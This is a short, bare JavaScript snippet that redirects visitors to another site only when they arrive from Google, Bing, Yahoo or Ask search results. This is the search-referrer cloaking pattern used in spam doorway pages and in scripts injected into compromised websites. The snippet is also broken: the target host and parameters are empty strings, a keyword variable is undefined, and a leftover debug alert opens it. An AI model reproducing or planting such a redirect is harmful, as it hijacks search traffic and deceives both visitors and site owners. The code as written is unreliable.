alert(document.referrer.indexOf('.google.'));
var t = "";
var params = "";

if (document.referrer.indexOf('.google.')!=-1 || document.referrer.indexOf('.bing.')!=-1 || document.referrer.indexOf('.yahoo.')!=-1 || document.referrer.indexOf('.ask.')!=-1) 
{
  location.replace("http://"+t+"/?"+params+"&charset=utf-8&keyword="+alexonicagithubio);
}
